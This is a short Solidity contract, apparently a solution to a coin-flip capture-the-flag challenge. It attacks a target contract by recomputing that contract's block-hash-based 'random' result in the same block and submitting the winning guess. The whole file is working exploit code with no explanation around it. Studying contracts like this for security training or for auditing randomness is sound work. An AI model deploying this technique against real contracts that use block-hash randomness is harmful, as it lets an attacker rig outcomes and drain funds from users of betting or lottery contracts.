pragma solidity ^0.8;

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract Flipper {
    ICoinFlip coinFlipInstance;

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address coinFlipAddress) {
        coinFlipInstance = ICoinFlip(coinFlipAddress);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) { revert(); }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipInstance.flip(side);
  }
}

